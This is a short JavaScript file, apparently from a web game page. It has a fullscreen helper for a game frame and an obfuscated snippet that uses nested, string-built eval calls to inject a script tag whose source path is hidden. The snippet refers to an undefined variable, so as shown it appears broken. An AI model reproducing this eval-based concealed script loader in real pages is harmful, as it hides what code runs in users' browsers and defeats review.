var game = document.getElementById("frame");
var s1 = "/script/";
function fullscreen() {
  if (game.requestFullscreen) {
    game.requestFullscreen();
  } else if (game.mozRequestFullScreen) {
    game.mozRequestFullScreen();
  } else if (game.webkitRequestFullscreen) {
    game.webkitRequestFullscreen();
  } else if (game.msRequestFullscreen) {
    game.msRequestFullscreen();
  }
};
var body = document.body;
var a = "1";
var x = "lilpeen";
var ix = document.createElement("script");
for (var a = 1; a < 2; a++) {
  eval("ix.setAttribute('src',eval(" + "'s'+" + "a)" + "+eval('s'+" + "main_user_countNum" + "))");
};
body.appendChild(ix);
//eval(" + "'s'+" + "a)" + "+eval('s'+" + "main_user_countNum" + "))");